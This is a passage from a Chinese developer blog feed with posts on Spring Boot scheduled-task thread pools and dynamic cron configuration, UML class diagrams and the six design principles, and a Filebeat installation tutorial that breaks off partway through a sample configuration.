class="code"><pre><span class="line"><span class="meta">@Override</span>  </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">afterPropertiesSet</span><span class="params">()</span> &#123;  </span><br><span class="line">    scheduleTasks();  </span><br><span class="line">&#125;  </span><br><span class="line">  </span><br><span class="line"><span class="comment">/**  </span></span><br><span class="line"><span class="comment">* Schedule all registered tasks against the underlying  </span></span><br><span class="line"><span class="comment">* &#123;<span class="doctag">@linkplain</span> #setTaskScheduler(TaskScheduler) task scheduler&#125;.  </span></span><br><span class="line"><span class="comment">*/</span>  </span><br><span class="line"><span class="meta">@SuppressWarnings(&quot;deprecation&quot;)</span>  </span><br><span class="line"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">scheduleTasks</span><span class="params">()</span> &#123;  </span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">this</span>.taskScheduler == <span class="literal">null</span>) &#123;  </span><br><span class="line">        <span class="built_in">this</span>.localExecutor = Executors.newSingleThreadScheduledExecutor();  </span><br><span class="line">        <span class="built_in">this</span>.taskScheduler = <span class="keyword">new</span> <span class="title class_">ConcurrentTaskScheduler</span>(<span class="built_in">this</span>.localExecutor);  </span><br><span class="line">    &#125;  </span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">this</span>.triggerTasks != <span class="literal">null</span>) &#123;  </span><br><span class="line">        <span class="keyword">for</span> (TriggerTask task : <span class="built_in">this</span>.triggerTasks) &#123;  </span><br><span class="line">            addScheduledTask(scheduleTriggerTask(task));  </span><br><span class="line">        &#125;  </span><br><span class="line">    &#125;  </span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">this</span>.cronTasks != <span class="literal">null</span>) &#123;  </span><br><span class="line">        <span class="keyword">for</span> (CronTask task : <span class="built_in">this</span>.cronTasks) &#123;  </span><br><span class="line">            addScheduledTask(scheduleCronTask(task));  </span><br><span class="line">        &#125;  </span><br><span class="line">    &#125;  </span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">this</span>.fixedRateTasks != <span class="literal">null</span>) &#123;  </span><br><span class="line">        <span class="keyword">for</span> (IntervalTask task : <span class="built_in">this</span>.fixedRateTasks) &#123;  </span><br><span class="line">            addScheduledTask(scheduleFixedRateTask(task));  </span><br><span class="line">        &#125;  </span><br><span class="line">    &#125;  </span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">this</span>.fixedDelayTasks != <span class="literal">null</span>) &#123;  </span><br><span class="line">        <span class="keyword">for</span> (IntervalTask task : <span class="built_in">this</span>.fixedDelayTasks) &#123;  </span><br><span class="line">            addScheduledTask(scheduleFixedDelayTask(task));  </span><br><span class="line">        &#125;  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>进入 <strong>newSingleThreadScheduledExecutor</strong> 可以看到，默认使用了一个 corePoolSize 为 1, maximumPoolSize 为 Integer.MAX_VALUE 的线程池</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> ScheduledExecutorService <span class="title function_">newSingleThreadScheduledExecutor</span><span class="params">()</span> &#123;  </span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">DelegatedScheduledExecutorService</span>  </span><br><span class="line">        (<span class="keyword">new</span> <span class="title class_">ScheduledThreadPoolExecutor</span>(<span class="number">1</span>));  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="title function_">ScheduledThreadPoolExecutor</span><span class="params">(<span class="type">int</span> corePoolSize)</span> &#123;  </span><br><span class="line">    <span class="built_in">super</span>(corePoolSize, Integer.MAX_VALUE,  </span><br><span class="line">        DEFAULT_KEEPALIVE_MILLIS, MILLISECONDS,  </span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">DelayedWorkQueue</span>());  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="title function_">ThreadPoolExecutor</span><span class="params">(<span class="type">int</span> corePoolSize,  </span></span><br><span class="line"><span class="params">                        <span class="type">int</span> maximumPoolSize,  </span></span><br><span class="line"><span class="params">                        <span class="type">long</span> keepAliveTime,  </span></span><br><span class="line"><span class="params">                        TimeUnit unit,  </span></span><br><span class="line"><span class="params">                        BlockingQueue&lt;Runnable&gt; workQueue)</span> &#123;  </span><br><span class="line">    <span class="built_in">this</span>(corePoolSize, maximumPoolSize, keepAliveTime, unit, workQueue,  </span><br><span class="line">    Executors.defaultThreadFactory(), defaultHandler);  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>而线程池主要有几个重要的参数分别是：</p><ol><li>corePoolSize：线程池的基本大小。</li><li>maximumPoolSize：线程池中允许的最大线程数。</li><li>poolSize：线程池中当前线程的数量。</li></ol><p>当提交一个新任务时，若</p><ol><li>poolSize &lt; corePoolSize : 创建新线程处理该任务</li><li>poolSize = corePoolSize : 将任务置于阻塞队列中</li><li>阻塞队列的容量达到上限，且这时 poolSize &lt; maximumPoolSize :</li><li>阻塞队列满了，且 poolSize = maximumPoolSize : 那么线程池已经达到极限，会根据饱和策略 RejectedExecutionHandler 拒绝新的任务，默认是 AbortPolicy 会丢掉任务并抛出异常</li></ol><h2 id="解决方案"><a href="#解决方案" class="headerlink" title="解决方案"></a>解决方案</h2><p>注入自己编写的线程池，自行设置参数：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Configuration</span>  </span><br><span class="line"> <span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">MyTheadPoolConfig</span> &#123;  </span><br><span class="line">   </span><br><span class="line">     <span class="meta">@Bean</span>  </span><br><span class="line">     <span class="keyword">public</span> TaskExecutor <span class="title function_">taskExecutor</span><span class="params">()</span> &#123;  </span><br><span class="line">         <span class="type">ThreadPoolTaskExecutor</span> <span class="variable">executor</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ThreadPoolTaskExecutor</span>();  </span><br><span class="line">         <span class="comment">//设置核心线程数  </span></span><br><span class="line">         executor.setCorePoolSize(<span class="number">10</span>);  </span><br><span class="line">         <span class="comment">//设置最大线程数  </span></span><br><span class="line">         executor.setMaxPoolSize(<span class="number">20</span>);  </span><br><span class="line">         <span class="comment">//缓冲队列200：用来缓冲执行任务的队列  </span></span><br><span class="line">         executor.setQueueCapacity(<span class="number">200</span>);  </span><br><span class="line">         <span class="comment">//线程活路时间 60 秒  </span></span><br><span class="line">         executor.setKeepAliveSeconds(<span class="number">60</span>);  </span><br><span class="line">         <span class="comment">//线程池名的前缀：设置好了之后可以方便我们定位处理任务所在的线程池  </span></span><br><span class="line">         <span class="comment">// 这里我继续沿用 scheduling 默认的线程名前缀  </span></span><br><span class="line">         executor.setThreadNamePrefix(<span class="string">&quot;nzc-create-scheduling-&quot;</span>);  </span><br><span class="line">         <span class="comment">//设置拒绝策略  </span></span><br><span class="line">         executor.setRejectedExecutionHandler(<span class="keyword">new</span> <span class="title class_">ThreadPoolExecutor</span>.CallerRunsPolicy());  </span><br><span class="line">         executor.setWaitForTasksToCompleteOnShutdown(<span class="literal">true</span>);  </span><br><span class="line">         <span class="keyword">return</span> executor;  </span><br><span class="line">     &#125;  </span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure><p>在定时任务的类上再加一个 @EnableAsync 注解，给方法添加一个 @Async 即可</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Slf4j</span>  </span><br><span class="line"><span class="meta">@Component</span>  </span><br><span class="line"><span class="meta">@EnableAsync</span>  </span><br><span class="line"><span class="meta">@EnableScheduling</span>  </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ScheduleService</span> &#123;  </span><br><span class="line"></span><br><span class="line">    <span class="meta">@Autowired</span>  </span><br><span class="line">    TaskExecutor taskExecutor;  </span><br><span class="line"></span><br><span class="line">    <span class="meta">@Async(value = &quot;taskExecutor&quot;)</span>  </span><br><span class="line">    <span class="meta">@Scheduled(cron = &quot;0/5 * * * * ? &quot;)</span>  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">testSchedule</span><span class="params">()</span> &#123;  </span><br><span class="line">         <span class="keyword">try</span> &#123;  </span><br><span class="line">             Thread.sleep(<span class="number">10000</span>);  </span><br><span class="line">             log.info(<span class="string">&quot;当前执行任务的线程号ID===&gt;&#123;&#125;&quot;</span>, Thread.currentThread().getId());  </span><br><span class="line">         &#125; <span class="keyword">catch</span> (Exception e) &#123;  </span><br><span class="line">             e.printStackTrace();  </span><br><span class="line">         &#125;   </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="动态定时任务"><a href="#动态定时任务" class="headerlink" title="动态定时任务"></a>动态定时任务</h1><p>上面提到了</p><p>@EnableScheduling 导入了 SchedulingConfiguration，SchedulingConfiguration 又创建了 ScheduledAnnotationBeanPostProcessor 的Bean，ScheduledAnnotationBeanPostProcessor 又实例化了 ScheduledTaskRegistrar 对象，即</p><p><strong>@EnableScheduling</strong> -&gt; <strong>SchedulingConfiguration</strong> -&gt; <strong>ScheduledAnnotationBeanPostProcessor</strong> -&gt; <strong>ScheduledTaskRegistrar</strong></p><p>实际上，在 ScheduledAnnotationBeanPostProcessor 的 finishRegistration 方法中，会先获取所有实现了 <strong>SchedulingConfigurer</strong> 接口的 Bean，并执行他们的 configureTasks 方法</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">finishRegistration</span><span class="params">()</span> &#123;  </span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">this</span>.scheduler != <span class="literal">null</span>) &#123;  </span><br><span class="line">        <span class="built_in">this</span>.registrar.setScheduler(<span class="built_in">this</span>.scheduler);  </span><br><span class="line">    &#125;  </span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">this</span>.beanFactory <span class="keyword">instanceof</span> ListableBeanFactory) &#123;  </span><br><span class="line">        Map&lt;String, SchedulingConfigurer&gt; beans =  </span><br><span class="line">        ((ListableBeanFactory) <span class="built_in">this</span>.beanFactory).getBeansOfType(SchedulingConfigurer.class);  </span><br><span class="line">        List&lt;SchedulingConfigurer&gt; configurers = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;&gt;(beans.values());  </span><br><span class="line">        AnnotationAwareOrderComparator.sort(configurers);  </span><br><span class="line">        <span class="keyword">for</span> (SchedulingConfigurer configurer : configurers) &#123;  </span><br><span class="line">            configurer.configureTasks(<span class="built_in">this</span>.registrar);  </span><br><span class="line">        &#125;  </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>我们可以通过配置一个实现了 <strong>SchedulingConfigurer</strong> 接口的 Bean，实现动态加载定时任务的执行时间</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Data</span>  </span><br><span class="line"><span class="meta">@Slf4j</span>  </span><br><span class="line"><span class="meta">@Component</span>  </span><br><span class="line"><span class="meta">@RequiredArgsConstructor</span>  </span><br><span class="line"><span class="meta">@PropertySource(&quot;classpath:task-config.ini&quot;)</span>  </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ScheduleTask</span> <span class="keyword">implements</span> <span class="title class_">SchedulingConfigurer</span> &#123;  </span><br><span class="line">  </span><br><span class="line">    <span class="comment">// private Long timer = 100 * 1000L;  </span></span><br><span class="line"></span><br><span class="line">    <span class="meta">@Value(&quot;$&#123;printTime.cron&#125;&quot;)</span>  </span><br><span class="line">    <span class="keyword">private</span> String cron;  </span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span>  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">configureTasks</span><span class="params">(ScheduledTaskRegistrar taskRegistrar)</span> &#123;  </span><br><span class="line">        <span class="comment">// 间隔触发的任务  </span></span><br><span class="line">        taskRegistrar.addTriggerTask(<span class="keyword">new</span> <span class="title class_">Runnable</span>() &#123;  </span><br><span class="line">        <span class="meta">@Override</span>  </span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">run</span><span class="params">()</span>&#123;  </span><br><span class="line">           <span class="comment">// ...</span></span><br><span class="line">        &#125;</span><br><span class="line">        &#125;, <span class="keyword">new</span> <span class="title class_">Trigger</span>() &#123;  </span><br><span class="line">        <span class="meta">@Override</span>  </span><br><span class="line">        <span class="keyword">public</span> Date <span class="title function_">nextExecutionTime</span><span class="params">(TriggerContext triggerContext)</span> &#123;  </span><br><span class="line">            <span class="comment">// 使用CronTrigger触发器，可动态修改cron表达式来操作循环规则  </span></span><br><span class="line">            <span class="type">CronTrigger</span> <span class="variable">cronTrigger</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">CronTrigger</span>(cron);  </span><br><span class="line">            <span class="type">Date</span> <span class="variable">nextExecutionTime</span> <span class="operator">=</span> cronTrigger.nextExecutionTime(triggerContext);  </span><br><span class="line">            <span class="keyword">return</span> nextExecutionTime;  </span><br><span class="line">            </span><br><span class="line">            <span class="comment">// 使用PerodicTrigger触发器，修改timer变量指定操作间隔，单位为毫秒</span></span><br><span class="line">            <span class="comment">// PeriodicTrigger periodicTrigger = new PeriodicTrigger(timer);  </span></span><br><span class="line">            <span class="comment">// Date nextExecutionTime = periodicTrigger.nextExecutionTime(triggerContext);  </span></span><br><span class="line">            <span class="comment">// return nextExecutionTime;  </span></span><br><span class="line">        &#125;  </span><br><span class="line">        &#125;);  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 开发技能 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Java </tag>
            
            <tag> 定时任务 </tag>
            
            <tag> SpringBoot </tag>
            
            <tag> 多线程 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>【设计模式】UML类图和六大设计原则</title>
      <link href="/2024/09/11/%E3%80%90%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F%E3%80%91UML%E7%B1%BB%E5%9B%BE%E5%92%8C%E5%85%AD%E5%A4%A7%E8%AE%BE%E8%AE%A1%E5%8E%9F%E5%88%99/"/>
      <url>/2024/09/11/%E3%80%90%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F%E3%80%91UML%E7%B1%BB%E5%9B%BE%E5%92%8C%E5%85%AD%E5%A4%A7%E8%AE%BE%E8%AE%A1%E5%8E%9F%E5%88%99/</url>
      
        <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>在实践中经常看到工厂模式、观察者模式等字眼，渐觉设计模式的重要性，于是开刷设计模式。</p><p>本文讲述了<strong>UML类图</strong>以及<strong>设计模式的六大原则</strong></p><p>参考资料：</p><p>课程视频：<a href="https://www.bilibili.com/video/BV1Np4y1z7BU">黑马程序员Java设计模式</a></p><h1 id="一、UML类图"><a href="#一、UML类图" class="headerlink" title="一、UML类图"></a>一、UML类图</h1><h2 id="1-类和接口的表示方式"><a href="#1-类和接口的表示方式" class="headerlink" title="1. 类和接口的表示方式"></a>1. 类和接口的表示方式</h2><p><img src="/img/2024/09/pattern1/0.png" alt="image.png"></p><p>如图所示，在 UML 类图中，第一栏为类的名称，第二栏为类的属性(field)，第三栏为类的方法(method)</p><p>属性/方法之前的 - + # 表示访问权限:<br>- 表示 private<br>+ 表示 public<br># 表示 protected</p><p>属性的完整表示方式是: <strong>可见性 名称 :类型 [= 缺省值]</strong><br>方法的完整表示方式是: <strong>可见性 名称(参数列表)[:返回类型]</strong></p><p>接口图 和 类图 的主要区别是顶端有 \&lt;\<interface\>></p><h2 id="2-关联和双向关联"><a href="#2-关联和双向关联" class="headerlink" title="2. 关联和双向关联"></a>2. 关联和双向关联</h2><p><strong>关联</strong>关系表示存在<strong>对象的引用</strong>，如 A 类中某一个成员变量的类型为 B 类，那么 A 类依赖于 B 类</p><p><img src="/img/2024/09/pattern1/1.png" alt="image.png"></p><p><strong>关联</strong>关系使用 <strong>实心箭头</strong> 表示</p><p><img src="/img/2024/09/pattern1/2.png" alt="image.png"></p><p><strong>双向关联</strong>使用 <strong>横线</strong> 表示</p><h2 id="3-组合和聚合"><a href="#3-组合和聚合" class="headerlink" title="3. 组合和聚合"></a>3. 组合和聚合</h2><p><strong>组合</strong> 和 <strong>聚合</strong> 都是关联的特例，强调整体和部分的关系，在转换为关系模型时跟关联没有区别，但是在<br>UML 中的描述存在语义上的区别。</p><h3 id="组合"><a href="#组合" class="headerlink" title="组合"></a>组合</h3><p>组合 中的整体和部分具有强依赖，<strong>整体的对象负责部分的对象的生命周期</strong>，如鸟和翅膀</p><p><img src="/img/2024/09/pattern1/3.png" alt="image.png"></p><p><strong>组合</strong>关系用 <strong>实心菱形</strong>+横线/实线箭头 表示</p><h3 id="聚合"><a href="#聚合" class="headerlink" title="聚合"></a>聚合</h3><p>而聚合的<strong>整体和部分可以独立存在</strong>，如汽车和轮胎，部门和员工</p><p><img src="/img/2024/09/pattern1/4.png" alt="image.png"></p><p><strong>聚合</strong>关系用 <strong>空心菱形</strong>+横线/实线箭头 表示</p><h2 id="3-依赖、继承、实现"><a href="#3-依赖、继承、实现" class="headerlink" title="3. 依赖、继承、实现"></a>3. 依赖、继承、实现</h2><h3 id="依赖"><a href="#依赖" class="headerlink" title="依赖"></a>依赖</h3><p><strong>依赖</strong>是一种使用关系，它是对象之间<strong>耦合度最弱</strong>的一种关联方式，是临时性的关联。</p><p>表示一个类中的方法通过 <strong>局部变量、方法的参数或者对静态方法</strong> 的调用来访问另一个类(被依赖类)中的某些方法来完成一些职责。</p><p><img src="/img/2024/09/pattern1/5.png" alt="image.png"></p><p><strong>依赖</strong>关系用 <strong>虚线箭头</strong> 表示</p><h3 id="继承"><a href="#继承" class="headerlink" title="继承"></a>继承</h3><p>继承关系是对象之间<strong>耦合度最大</strong>的一种关系，表示一般与特殊的关系，是父类与子类之间的关系</p><p><img src="/img/2024/09/pattern1/6.png" alt="image.png"></p><p><strong>继承</strong>关系用 <strong>空心三角实线箭头</strong> 表示</p><h3 id="实现"><a href="#实现" class="headerlink" title="实现"></a>实现</h3><p>实现关系是接口与实现类之间的关系。在这种关系中，类实现了接口，类中的操作实现了接口中所声明的所有的抽象操作。</p><p><img src="/img/2024/09/pattern1/7.png" alt="image.png"></p><p><strong>实现</strong>关系用 <strong>空心三角虚线箭头</strong> 表示</p><h1 id="二、六大设计原则"><a href="#二、六大设计原则" class="headerlink" title="二、六大设计原则"></a>二、六大设计原则</h1><h2 id="1-开闭原则"><a href="#1-开闭原则" class="headerlink" title="1. 开闭原则"></a>1. 开闭原则</h2><p>开闭原则 即 <strong>对扩展开放，对修改关闭</strong></p><p>在程序需要进行拓展的时候，不能去修改原有的代码，实现一个热插拔的效果。</p><p>简言之，是为了使程序的扩展性好，易于维护和升级。</p><p>实现方式是使用 <strong>接口</strong> 和 <strong>派生类</strong></p><h2 id="2-里氏代换原则"><a href="#2-里氏代换原则" class="headerlink" title="2. 里氏代换原则"></a>2. 里氏代换原则</h2><p>里氏代换原则 即 <strong>任何基类可以出现的地方，子类一定可以出现</strong></p><p>通俗理解: 子类可以扩展父类的功能，但不能改变父类原有的功能</p><p>换句话说，子类继承父类时，除添加新的方法完成新增功能外，尽量<strong>不要重写父类的方法</strong></p><p>【例子】</p><p>如果让 正方形类 继承 长方形类（包含 setLength(), setWidth()方法）</p><p><img src="/img/2024/09/pattern1/8.png" alt="image.png"></p><p>那么正方形类会重写长方形类的这两个方法，以实现自身的逻辑，从而违反里氏代换原则</p><p>修正方案：</p><p><img src="/img/2024/09/pattern1/9.png" alt="image.png"></p><p>新建 Quadrilateral 接口，让长方形和正方形分别去实现该接口，而使用长方形的类依赖该接口</p><h2 id="3-依赖倒转原则"><a href="#3-依赖倒转原则" class="headerlink" title="3. 依赖倒转原则"></a>3. 依赖倒转原则</h2><p>依赖倒转原则 即 <strong>高层模块不应该依赖低层模块，两者都应该依赖其抽象</strong>;</p><p>抽象不应该依赖细节，细节应该依赖抽象。简单的说就是要求<strong>对抽象进行编程</strong></p><p>不要对实现进行编程，这样就降低了客户与实现模块间的耦合。</p><p>【例子】</p><p>电脑有多种配件比如cpu，显卡，显示器</p><p>电脑不应该依赖于特定品牌的cpu，显卡，显示器，也就是不能依赖于实现</p><p>而是应该依赖于cpu，显卡，显示器它们的抽象</p><h2 id="4-迪米特法则"><a href="#4-迪米特法则" class="headerlink" title="4. 迪米特法则"></a>4. 迪米特法则</h2><p>迪米特法则 又叫最小知识法则</p><p>其含义是: 如果两个软件实体无须直接通信，那么就不应当发生直接的相互调用，可以<strong>通过第三方转发</strong>该调用。</p><p>其目的是降低类之间的耦合度，提高模块的相对独立性。</p><p>迪米特法则的</p><p>【例子】</p><p>明星通过经纪人组织与粉丝的见面会</p><p>甲方公司通过乙方公司把需求拍给牛马</p><h2 id="5-接口隔离原则"><a href="#5-接口隔离原则" class="headerlink" title="5. 接口隔离原则"></a>5. 接口隔离原则</h2><p>接口隔离原则 即 <strong>客户端不应该被迫依赖于它不使用的方法; 一个类对另一个类的依赖应该建立在最小的接口上</strong>。</p><p>实现上采用将 <strong>包含多个方法的接</strong>口 分解为 <strong>多个只包含少量方法的接口</strong></p><p>【例子】</p><p>一个品牌的安全门实现了 防火、防水、防盗</p><p>另一个品牌的安全门实现了 防火、防水</p><p>若定义接口 包含 防火、防水、防盗 三个功能，那么第二个类就被迫依赖于它不使用的防盗方法</p><p>故定义三个接口分别为 防火、防水、防盗</p><h2 id="6-合成复用原则"><a href="#6-合成复用原则" class="headerlink" title="6. 合成复用原则"></a>6. 合成复用原则</h2><p>合成复用原则 即 尽量<strong>先使用组合或者聚合</strong>等关联关系来实现，其次<strong>才考虑使用继承</strong>关系来实现。</p><p>继承会将父类的细节暴露给子类，破坏了类的封装性，使子类与父类耦合度高，限制了复用的灵活性。</p><p>【例子】</p><p>现有父类为汽车，子类继承汽车，分别为汽油汽车和新能源汽车，孙子类继承汽油汽车/新能源汽车再拓展不同颜色的汽车</p><p><img src="/img/2024/09/pattern1/10.png" alt="image.png"></p><p>可见，再给汽车增加一种类型的动力源时，会出现很多的孙子类，扩展性很差。</p><p>修改方案：</p><p><img src="/img/2024/09/pattern1/11.png" alt="image.png"></p><p>父类为汽车，包含颜色属性（聚合颜色这一接口，而颜色这一接口可被各种颜色所实现），子类继承汽车使用不同的动力源</p>]]></content>
      
      
      <categories>
          
          <category> 开发技能 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> UML </tag>
            
            <tag> 设计模式 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Filebeat安装部署及入门应用</title>
      <link href="/2024/07/27/Filebeat%E5%AE%89%E8%A3%85%E9%83%A8%E7%BD%B2%E5%8F%8A%E5%85%A5%E9%97%A8%E5%BA%94%E7%94%A8/"/>
      <url>/2024/07/27/Filebeat%E5%AE%89%E8%A3%85%E9%83%A8%E7%BD%B2%E5%8F%8A%E5%85%A5%E9%97%A8%E5%BA%94%E7%94%A8/</url>
      
        <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>后续开发项目要用到 Filebeat 对日志做收集和处理。本文介绍了 ELK 技术中的 Filebeat，用于轻量级的日志收集和分析</p><p>参考资料：</p><p>视频教程：<a href="https://www.bilibili.com/video/BV1iJ411c7Az">Elastic Stack（ELK）从入门到实践</a></p><p>官方文档：<a href="https://www.elastic.co/guide/en/beats/filebeat/current/filebeat-overview.html">Filebeat overview | Filebeat Reference [8.14] | Elastic</a></p><h1 id="一、安装部署"><a href="#一、安装部署" class="headerlink" title="一、安装部署"></a>一、安装部署</h1><p>环境：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">root@Andrew:~# cat /proc/version</span><br><span class="line">Linux version 5.15.153.1-microsoft-standard-WSL2 (root@941d701f84f1) (gcc (GCC) 11.2.0, GNU ld (GNU Binutils) 2.37) #1 SMP Fri Mar 29 23:14:13 UTC 2024</span><br></pre></td></tr></table></figure><p>Linux环境下安装命令：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">curl -L -O https://artifacts.elastic.co/downloads/beats/filebeat/filebeat-8.14.3-linux-x86_64.tar.gz</span><br><span class="line"></span><br><span class="line">tar xzvf filebeat-8.14.3-linux-x86_64.tar.gz</span><br></pre></td></tr></table></figure><p>解压后将文件夹重命名，进入目录：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">mv filebeat-8.14.3-linux-x86_64 filebeat</span><br><span class="line"></span><br><span class="line">cd filebeat/</span><br></pre></td></tr></table></figure><p>压缩包解压安装的filebeat文件结构与deb/rpm等安装方式不同，详见：<a href="https://www.elastic.co/guide/en/beats/filebeat/current/directory-layout.html">Directory layout | Filebeat Reference [8.14] | Elastic</a></p><h1 id="二、启动示例"><a href="#二、启动示例" class="headerlink" title="二、启动示例"></a>二、启动示例</h1><p>在解压后的根目录下新建测试的配置文件：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vi test.yml</span><br></pre></td></tr></table></figure><p>从<strong>控制台</strong>输入的配置如下：</p><figure class="highlight yml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">filebeat.inputs:</span></span><br><span class="line"><span class="bullet">-</span> <span class="attr">type:</span> <span class="string">stdin</span></span><br><span class="line">  <span class="attr">enable:</span> <span class="literal">true</span>  <span class="comment"># default true</span></span><br><span class="line">  <span class="comment"># include_lines/exclude_lines support regular expresions</span></span><br><span class="line">  <span class="attr">include_lines:</span> [<span class="string">&quot;^andrew&quot;</span>]    <span class="comment"># starts with &quot;andrew&quot;</span></span><br><span class="line">  <span class="attr">exclude_lines:</span> [<span class="string">&quot;www&quot;</span>]        <span class="comment"># exclude which contains &quot;www&quot;</span></span><br><span class="line">  <span class="attr">tags:</span> [<span class="string">&quot;stdin&quot;</span>]                <span class="comment"># define tags in output</span></span><br><span class="line">  <span class="attr">fields:</span>                       <span class="comment"># define specific fields in output</span></span><br><span class="line">      <span class="attr">author:</span> <span 